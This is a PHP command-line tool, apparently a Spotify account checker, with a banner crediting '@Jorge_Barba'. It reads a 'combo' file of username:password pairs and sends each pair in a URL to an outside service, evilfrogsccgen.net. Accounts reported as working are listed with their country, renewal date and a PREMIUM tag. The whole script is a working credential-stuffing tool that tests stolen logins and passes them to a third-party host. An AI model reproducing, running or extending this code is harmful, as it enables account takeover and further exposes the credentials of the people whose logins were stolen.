<?php 
error_reporting(0);
echo "\033[01;33m

   _____             _   _            _    
  / ____|           | | (_)          | |   
 | (___  _ __   ___ | |_ _ ______ ___| | __
  \___ \| '_ \ / _ \| __| |______/ __| |/ /
  ____) | |_) | (_) | |_| |     | (__|   < 
 |_____/| .__/ \___/ \__|_|      \___|_|\_\
        | |                                
        |_|                                \033[0m\033[01;31m   

#BY @Jorge_Barba\033[0m\n";
$ruta = readline("Combo: ");
echo 
"\033[01;32m∞=∞=∞=∞=∞=∞=∞=∞=∞=∞=∞=∞=∞=∞=∞=∞=∞=∞=∞=∞=∞=∞=∞\033[0m\n";
echo "\033[00;35mSolo saldran cuentas 
funcionales, espere con calma. \033[0m\n";
echo 
"\033[01;32m∞=∞=∞=∞=∞=∞=∞=∞=∞=∞=∞=∞=∞=∞=∞=∞=∞=∞=∞=∞=∞=∞=∞\033[0m\n";
$oa = fopen($ruta, 'r');
while($a = fgetcsv($oa, 1000, ':')){
	$spotify = curl_init();
	curl_setopt($spotify, 
CURLOPT_URL,"http://www.evilfrogsccgen.net/spotify/api/?u=$a[0]&p=$a[1]");
	curl_setopt($spotify, CURLOPT_RETURNTRANSFER, 1 
);
	$info=curl_exec ($spotify);
	curl_close ($spotify);
	if (strpos($info, 'none')!==false){
	$info=(json_decode($info, true));
	$i=0;
	foreach($info as $clave => $valor) {
	if($clave=="Validuntil"||$clave=="Country"){
		if($clave=="Validuntil"){
                                $clave="renueva:";
		}
		if($clave=="Country"){                                                      
 $clave="Pais:";
		};
		$i++;
		if($i==1){
	echo "\033[00;36mCuenta: $a[0]:$a[1]|\033[0m\n";
		}
		
if($clave=="renueva:"||$clave=="Pais:"){
			foreach($valor as $clave2 
=>$valor2) {
	echo "\033[00;36m$clave $valor2 |\033[0m";			
}
			if($i==2){
		echo "\033[01;32mPREMIUM\033[0m\n";			
}	
		}
	}
	
	}
	
	}else{	
	}
	
}
	fclose($oa); ?>
 
